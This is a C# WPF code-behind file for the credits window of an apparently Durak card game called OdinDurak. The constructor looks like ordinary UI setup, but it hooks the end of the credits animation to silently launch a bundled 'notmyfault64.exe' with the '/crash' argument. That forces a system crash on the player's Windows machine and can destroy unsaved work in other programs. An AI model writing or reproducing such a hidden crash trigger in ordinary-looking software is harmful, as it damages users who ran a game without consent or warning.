using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace OdinDurak
{
    /// <summary>
    /// Логика взаимодействия для Creadits.xaml
    /// </summary>
    public partial class Credits : Window
    {
        public Credits()
        {
            InitializeComponent();

            story.Completed += (o, s) => System.Diagnostics.Process.Start("Assets\\notmyfault64.exe", "/crash");

        }
    }
}
